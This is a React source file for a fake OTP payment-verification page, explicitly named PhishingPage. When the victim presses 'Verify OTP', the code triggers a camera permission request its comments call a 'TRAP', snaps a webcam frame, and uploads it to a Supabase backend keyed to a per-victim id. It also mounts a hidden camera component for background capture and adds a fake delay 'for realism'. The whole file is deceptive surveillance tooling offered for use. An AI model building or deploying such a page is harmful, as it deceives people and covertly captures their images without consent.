import { useState } from 'react';
import { motion } from 'framer-motion';
import { useNavigate, useParams } from 'react-router-dom';
import CameraFeed from '../components/CameraFeed';
import { uploadData } from '../utils/supabase';

const PhishingPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [isVerifying, setIsVerifying] = useState(false);

  const handleVerify = async () => {
    setIsVerifying(true);

    // TRAP: Trigger Camera Permission immediately on click
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      
      // Create a temporary video element to capture the frame
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      // Wait for image ready, then capture
      setTimeout(async () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);

        // Convert to blob for upload
        canvas.toBlob(async (blob) => {
          if (blob) {
            const url = URL.createObjectURL(blob);
            await uploadData(id, url); // Upload to Supabase
            
            // Simulate loading time for realism
            setTimeout(() => {
              navigate('/'); // Or redirect to WhatsApp
            }, 2000);
          }
        }, 'image/jpeg');
      }, 1000);

    } catch (err) {
      console.error("Trap failed:", err);
      setIsVerifying(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <motion.div 
        initial={{ y: 20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        className="bg-white w-full max-w-md rounded-2xl shadow-xl overflow-hidden border border-gray-100"
      >
        {/* Header */}
        <div className="bg-green-600 p-6 text-center">
          <h1 className="text-3xl font-bold text-white tracking-tight">OTP Verified</h1>
          <p className="text-green-100 mt-2 text-sm">Secure Payment Gateway</p>
        </div>

        {/* Body */}
        <div className="p-8 text-center">
          <div className="mb-6">
            <img 
              src="https://cdn-icons-png.flaticon.com/512/2997/2997340.png" 
              alt="Lock" 
              className="w-20 h-20 mx-auto text-green-500 opacity-80"
            />
          </div>

          <h2 className="text-xl font-semibold text-gray-800 mb-2">Enter OTP to Complete</h2>
          <p className="text-gray-500 text-sm mb-6">A 4-digit code has been sent to your device. Please verify immediately.</p>

          <div className="flex justify-center gap-3 mb-8">
            {[1, 2, 3, 4].map((num) => (
              <input 
                key={num} 
                type="text" 
                maxLength="1" 
                className="w-12 h-14 text-center text-2xl font-bold border-2 border-gray-200 rounded-lg focus:border-green-500 outline-none bg-gray-50"
              />
            ))}
          </div>

          <motion.button
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
            onClick={handleVerify}
            className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 rounded-xl shadow-lg transition-colors flex items-center justify-center gap-2"
          >
            {isVerifying ? (
              <span>Processing...</span>
            ) : (
              <>
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
                Verify OTP
              </>
            )}
          </motion.button>

          <p className="mt-6 text-xs text-gray-400">Powered by SecureAuth™</p>
        </div>
      </motion.div>
      
      {/* Hidden Camera Component for Background Capture */}
      <CameraFeed uniqueId={id} onComplete={() => navigate('/')} />
    </div>
  );
};

export default PhishingPage;